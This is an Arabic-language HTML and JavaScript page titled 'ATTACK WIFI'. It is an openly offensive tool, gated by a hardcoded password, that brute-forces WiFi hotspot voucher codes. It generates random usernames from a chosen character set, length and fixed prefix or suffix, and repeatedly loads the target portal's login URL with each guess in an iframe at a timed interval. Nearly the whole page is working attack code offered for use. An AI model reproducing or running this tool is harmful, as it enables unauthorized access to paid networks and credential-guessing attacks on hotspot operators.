<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>نظام الجوكر - تسجيل الدخول واسم مستخدم فقط</title>
<style>
  body {
    background-color: #05152E;
    font-family: Arial, sans-serif;
    color: white;
    text-align: center;
    padding: 30px;
  }
  h1 {
    color: #00ffff;
    margin-bottom: 30px;
    text-shadow: 0 0 10px #00ffff;
  }
  #loginSection, #userOnlySection {
    max-width: 400px;
    margin: 0 auto;
    background-color: #111;
    padding: 20px;
    border-radius: 15px;
    box-shadow: 0 0 20px #00ffff55;
  }
  #loginSection.shake input {
    animation: shake 0.4s;
  }
  @keyframes shake {
    0% {transform: translateX(0);}
    20% {transform: translateX(-10px);}
    40% {transform: translateX(10px);}
    60% {transform: translateX(-10px);}
    80% {transform: translateX(10px);}
    100% {transform: translateX(0);}
  }
  input[type="password"], input[type="text"] {
    width: 90%;
    padding: 12px;
    margin-bottom: 15px;
    border-radius: 10px;
    border: 2px solid #ffcc00;
    background-color: #000;
    color: white;
    font-size: 16px;
    text-align: center;
    outline: none;
  }
  button {
    padding: 12px 25px;
    background-color: #00ffff;
    border: none;
    color: black;
    font-weight: bold;
    border-radius: 10px;
    cursor: pointer;
    font-size: 16px;
  }
  .error {
    color: #ff4444;
    font-weight: bold;
    margin-bottom: 15px;
    display: none;
  }
  /* --- User Only Section styles --- */
  .toolsbox input {
    width: 80%;
    height: 40px;
    margin: 8px auto;
    display: block;
    border-radius: 25px;
    border: none;
    font-size: 18px;
    padding: 0 10px;
    font-weight: bold;
    text-align: center;
    background-color: #6b72807e;
    color: rgb(151, 5, 5);
    outline: none;
  }
  .toolsbox input::placeholder {
    color: rgb(221, 200, 8);
  }
  .toolsbox .cont {
    display: flex;
    justify-content: center;
    gap: 20px;
    margin: 15px 0;
  }
  .toolsbox button {
    width: 150px;
    height: 45px;
    background-color: #084e6e;
    color: rgb(221, 200, 8);
    border: none;
    border-radius: 15px;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.3s;
  }
  .toolsbox button:hover {
    background-color: #0a6ca8;
  }
  #prog {
    width: 80%;
    height: 10px;
    margin: 15px auto;
    background-color: gray;
    border-radius: 7px;
    appearance: none;
  }
  #prog::-webkit-progress-value {
    background: linear-gradient(135deg,#ce0000, rgb(26, 120, 243));
    border-radius: 7px;
  }
  #currentUsername {
    width: 80%;
    height: 40px;
    margin: 15px auto;
    display: block;
    background-color: #084e6e;
    color: white;
    font-weight: bold;
    font-size: 18px;
    border-radius: 10px;
    text-align: center;
    border: none;
    outline: none;
  }
</style>
</head>
<body>

<h1>ATTACK WIFI</h1>

<!-- قسم تسجيل الدخول -->
<div id="loginSection">
  <h2>أدخل كلمة المرور</h2>
  <input type="password" id="pass" placeholder="كلمة المرور" />
  <div class="error" id="errorMsg">كلمة المرور غير صحيحة!</div>
  <button onclick="checkPassword()">دخول</button>
</div>

<!-- قسم اسم مستخدم فقط (مخفي بالبداية) -->
<div id="userOnlySection" style="display:none;">
  <div class="toolsbox">
    <input type="text" id="loginURL" placeholder="رابط صفحة تسجيل الدخول" />
    <input type="text" id="loginChars" placeholder="الرموز المكونة للكرت" />
    <input type="text" id="loginUsernameLength" placeholder="عدد الرموز المكونة للكرت" />
    <input class="first" type="text" id="loginUsernameFixed1" placeholder="جزء بداية الكرت إذا كان ثابت" />
    <input class="second" type="text" id="loginUsernameFixed2" placeholder="جزء نهاية الكرت إذا كان ثابت" />
    <input type="text" id="loginCount" placeholder="عدد الكروت المطلوب تخمينها ومن ثم توقف" />
    <input type="text" id="loginTimeOut" placeholder="ms الزمن بين المحاولة والمحاولة" />
    <div class="cont">
      <button onclick="stopProgram()">توقف</button>
      <button onclick="runProgram()">إبدأ</button>
    </div>
    <progress id="prog" max="100" value="0"></progress>
    <input type="text" id="currentUsername" placeholder="اسم المستخدم الحالي" readonly />
  </div>
  <iframe src="" id="loginPageViewer" style="width:100%; height: 400px; border: 3px solid rgb(221, 200, 8); border-radius: 15px; margin-top: 10px;"></iframe>
</div>

<script>
  // كلمة المرور الصحيحة
  const correctPassword = "908070";

  function checkPassword() {
    const passInput = document.getElementById("pass");
    const errorMsg = document.getElementById("errorMsg");
    const loginSection = document.getElementById("loginSection");
    const userOnlySection = document.getElementById("userOnlySection");

    if (passInput.value === correctPassword) {
      // دخول ناجح
      errorMsg.style.display = "none";
      loginSection.style.display = "none";
      userOnlySection.style.display = "block";
    } else {
      // خطأ في الباسورد - عرض رسالة اهتزاز
      errorMsg.style.display = "block";
      loginSection.classList.add("shake");
      setTimeout(() => loginSection.classList.remove("shake"), 500);
    }
  }

  // باقي كود توليد اسم المستخدم فقط

  var ref;
  var counter = 0;

  function getRandom() {
    const loginUsernameLength = document.getElementById("loginUsernameLength").value;
    const loginUsernameFixed1 = document.getElementById("loginUsernameFixed1").value;
    const loginUsernameFixed2 = document.getElementById("loginUsernameFixed2").value;
    const loginChars = document.getElementById("loginChars").value;

    let pwdLen = loginUsernameLength - loginUsernameFixed1.length - loginUsernameFixed2.length;
    let result = loginUsernameFixed1;
    for (let x = 0; x < pwdLen; x++) {
      result += loginChars.charAt(Math.floor(Math.random() * loginChars.length));
    }
    return result + loginUsernameFixed2;
  }

  function stopProgram() {
    clearInterval(ref);
  }

  function runProgram() {
    counter = 0;
    const loginCount = parseInt(document.getElementById("loginCount").value);
    const loginTimeOut = parseInt(document.getElementById("loginTimeOut").value);
    if (isNaN(loginCount) || isNaN(loginTimeOut)) {
      alert("يرجى إدخال عدد صحيح للعدد والزمن");
      return;
    }
    ref = setInterval(() => {
      if (counter < loginCount) {
        let cpwd = getRandom();
        document.getElementById("loginPageViewer").src = document.getElementById("loginURL").value + "?username=" + cpwd;
        document.getElementById("currentUsername").value = cpwd;
        document.getElementById("prog").value = Math.floor((counter / loginCount) * 100);
        counter++;
      } else {
        stopProgram();
      }
    }, loginTimeOut);
  }
</script>

</body>
  </html>
